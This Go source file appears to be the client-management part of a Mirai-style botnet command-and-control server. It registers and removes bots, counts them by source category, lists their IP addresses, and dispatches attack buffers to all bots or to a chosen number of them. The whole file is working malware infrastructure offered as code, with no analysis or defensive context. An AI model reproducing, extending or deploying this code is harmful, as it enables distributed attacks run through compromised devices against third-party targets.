package main

import (
    "net"
    "time"
    "math/rand"
    "sync"
    "fmt"
)

type AttackSend struct {
    buf         []byte
    count       int
    botCata     string
}

type ClientList struct {
    uid         int
    count       int
    clients     map[int]*Bot
    addQueue    chan *Bot
    delQueue    chan *Bot
    atkQueue    chan *AttackSend
    totalCount  chan int
    cntView     chan int
    distViewReq chan int
    distViewRes chan map[string]int
    ipViewReq   chan int       // request bot IP list
    ipViewRes   chan []string  // response bot IP list
    cntMutex    *sync.Mutex
}

func NewClientList() *ClientList {
    c := &ClientList{
        uid:         0,
        count:       0,
        clients:     make(map[int]*Bot),
        addQueue:    make(chan *Bot, 128),
        delQueue:    make(chan *Bot, 128),
        atkQueue:    make(chan *AttackSend),
        totalCount:  make(chan int, 64),
        cntView:     make(chan int),
        distViewReq: make(chan int),
        distViewRes: make(chan map[string]int),
        ipViewReq:   make(chan int),
        ipViewRes:   make(chan []string),
        cntMutex:    &sync.Mutex{},
    }
    go c.worker()
    go c.fastCountWorker()
    return c
}

func (this *ClientList) Count() int {
    this.cntMutex.Lock()
    defer this.cntMutex.Unlock()

    this.cntView <- 0
    return <-this.cntView
}

// GetIPs returns the list of remote IP addresses for all currently connected bots.
// IPs are extracted directly from the Go runtime TCP socket (conn.RemoteAddr),
// so they are always accurate and strictly bot-only (admins are excluded).
func (this *ClientList) GetIPs() []string {
    this.cntMutex.Lock()
    defer this.cntMutex.Unlock()
    this.ipViewReq <- 0
    return <-this.ipViewRes
}

func (this *ClientList) Distribution() map[string]int {
    this.cntMutex.Lock()
    defer this.cntMutex.Unlock()
    this.distViewReq <- 0
    return <-this.distViewRes
}

func (this *ClientList) AddClient(c *Bot) {
    this.addQueue <- c
}

func (this *ClientList) DelClient(c *Bot) {
    this.delQueue <- c
    fmt.Printf("Deleted client %d - %s - %s\n", c.version, c.source, c.conn.RemoteAddr())
}

func (this *ClientList) QueueBuf(buf []byte, maxbots int, botCata string) {
    attack := &AttackSend{buf, maxbots, botCata}
    this.atkQueue <- attack
}

func (this *ClientList) fastCountWorker() {
    for {
        select {
        case delta := <-this.totalCount:
            this.count += delta
            break
        case <-this.cntView:
            this.cntView <- this.count
            break
        }
    }
}

func (this *ClientList) worker() {
    rand.Seed(time.Now().UTC().UnixNano())

    for {
        select {
        case add := <-this.addQueue:
            this.totalCount <- 1
            this.uid++
            add.uid = this.uid
            this.clients[add.uid] = add
            break
        case del := <-this.delQueue:
            this.totalCount <- -1
            delete(this.clients, del.uid)
            break
        case atk := <-this.atkQueue:
            if atk.count == -1 {
                for _,v := range this.clients {
                    if atk.botCata == "" || atk.botCata == v.source {
                        v.QueueBuf(atk.buf)
                    }
                }
            } else {
                var count int
                for _, v := range this.clients {
                    if count > atk.count {
                        break
                    }
                    if atk.botCata == "" || atk.botCata == v.source {
                        v.QueueBuf(atk.buf)
                        count++
                    }
                }
            }
            break
        case <-this.cntView:
            this.cntView <- this.count
            break
        case <-this.distViewReq:
            res := make(map[string]int)
            for _,v := range this.clients {
                if ok,_ := res[v.source]; ok > 0 {
                    res[v.source]++
                } else {
                    res[v.source] = 1
                }
            }
            this.distViewRes <- res
        case <-this.ipViewReq:
            ips := make([]string, 0, len(this.clients))
            for _, v := range this.clients {
                tcpAddr, ok := v.conn.RemoteAddr().(*net.TCPAddr)
                if !ok {
                    continue
                }
                ip := tcpAddr.IP
                // Normalise IPv4-mapped IPv6 (::ffff:x.x.x.x) to plain IPv4
                if ip4 := ip.To4(); ip4 != nil {
                    ip = ip4
                }
                ips = append(ips, ip.String())
            }
            this.ipViewRes <- ips
        }
    }
}

